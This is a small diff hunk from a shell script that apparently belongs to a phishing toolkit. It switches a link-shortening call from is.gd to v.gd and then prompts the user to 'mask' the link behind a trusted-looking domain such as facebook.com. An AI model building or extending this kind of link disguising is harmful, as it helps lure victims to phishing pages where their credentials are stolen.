@@ -266,7 +266,7 @@ ash() {
          }
         echo
 	echo -e "\e[1;96m=============================================================\e[m "
-        short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${link})
+        short=$(curl -s https://v.gd/create.php\?format\=simple\&url\=${link})
         shorter=${short#https://}
         echo
         read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;92m Mask Your url domain here [\e[1;91mEx. https://facebook.com\e[1;92m] :\e[m ' mask
